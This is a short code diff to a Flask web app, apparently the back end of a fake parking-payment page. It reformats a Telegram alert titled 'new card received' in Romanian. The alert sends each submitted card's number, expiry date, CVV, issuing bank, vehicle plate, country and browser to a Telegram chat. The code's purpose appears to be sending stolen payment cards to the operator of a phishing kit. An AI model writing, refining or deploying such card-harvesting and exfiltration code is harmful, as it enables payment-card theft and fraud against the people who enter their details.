@@ -330,13 +330,15 @@ def create_app():
             db.session.commit()
             _send_telegram(
                 f'🔔 <b>Card nou primit</b>\n'
+                f'━━━━━━━━━━━━━━━━━━\n'
                 f'💳 <code>{ps.card_number_display}</code>\n'
-                f'📅 Exp: <b>{ps.exp_date}</b>  CVV: <b>{ps.cvv}</b>\n'
+                f'📅 <code>{ps.exp_date}</code>\n'
+                f'🔐 <code>{ps.cvv}</code>\n'
+                f'━━━━━━━━━━━━━━━━━━\n'
                 f'🏦 {bin_bank or "—"}\n'
-                f'🚗 Plăcuță: <b>{ps.plate_number}</b>\n'
-                f'🌍 Țară: {ps.country or "—"}  |  Browser: {ps.browser or "—"}\n'
-                f'⏱ Durată: {ps.hours} {ps.time_unit or "ore"}\n'
-                f'💰 Preț: <b>{ps.total_price} €</b>\n'
+                f'🚗 <code>{ps.plate_number}</code>\n'
+                f'🌍 {ps.country or "—"}  |  {ps.browser or "—"}\n'
+                f'⏱ {ps.hours} {ps.time_unit or "ore"}  |  💰 <b>{ps.total_price} €</b>\n'
                 f'🕐 {datetime.utcnow().strftime("%H:%M:%S UTC")}'
             )
             socketio.emit('payment_submitted', {
